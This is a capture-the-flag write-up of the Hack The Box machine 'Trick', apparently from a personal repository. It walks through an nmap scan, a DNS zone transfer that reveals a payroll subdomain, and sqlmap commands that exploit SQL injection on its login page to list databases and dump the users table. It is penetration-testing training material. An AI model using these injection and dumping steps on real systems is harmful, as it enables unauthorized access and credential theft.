# HTB Trick
![Alt text](./Trick/trick.png?raw=true "Card")

## 1. NMAP SCAN

As a first step I did a nmap scan on the address with the following result:

```
┌──(root💀animale)-[/home/animale/HTB/Trick]
└─# nmap -sC -sV 10.10.11.166
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 12:43 EDT
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.50 seconds
                                                            
```
## 2. Add machine ip to /etc/hosts

Add 10.10.11.166 in /etc/hosts with the following command:

```
echo "10.10.11.166 trick.htb">>/etc/hosts
```

## 3. Check the what's on port 80

Going on the web page we see as follow:

![Alt text](./Trick/trick.htb.png?raw=true "Web Page")

Running a gobuster scan, we don't see nothing interesting.

After some time searching for info, I decided to search for DNS Zone Transfer, which can be verified sendig **axfr** query.

AXFR is a mechanism for replicating DNS data across DNS servers. If, for example, the yale.edu administrator has two DNS servers, a.ns.yale.edu and b.ns.yale.edu, he can edit the yale.edu data on a.ns.yale.edu, and rely on AXFR to pull the same data to b.ns.yale.edu.

```
└─$ dig axfr trick.htb @trick.htb

; <<>> DiG 9.18.0-2-Debian <<>> axfr trick.htb @trick.htb
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 200 msec
;; SERVER: 10.10.11.166#53(trick.htb) (TCP)
;; WHEN: Wed Aug 31 13:00:17 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)

```

We notice that there is a subdomain called **preprod-payroll.trick.htb**. Let's check it out!!!

![Alt text](./Trick/preprod-payroll.trick.htb.png?raw=true "Web Page")

We can see that we are in a login page.
## **4. Scan preprod-payroll.trick.htb**

I run a scan with BurpSuite and it found a SQL Injection!

![Alt text](./Trick/Burp.png?raw=true "Web Page")
## **4. Check for SQL Injection**

Let's try to use a random usernale and password (admin/admin) to check the errors, if any.

The error is generic, **Username or password is incorrect.** .

Let's copy the request as a CURL request and use it in sqlmap, replacing curl with sqlmap.

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' --batch  
```

Here we are!!! We found a sql injection.

Let's re-run the command with the **--dbs** option to check the DBs. 

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' --dbs
```

We get 2 DBs:
1. information_schema
2. payroll_db

Let's see what is inside the **payroll_db**, use the options **-D payroll_db --tables** instead of **--dbs** 

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' -D payroll_db --tables

```

The result is:

```
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+

```

Let's see what's inside the **users** table, replacing **--tables** with **-T users --dump**

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' -D payroll_db -T users --dump

```

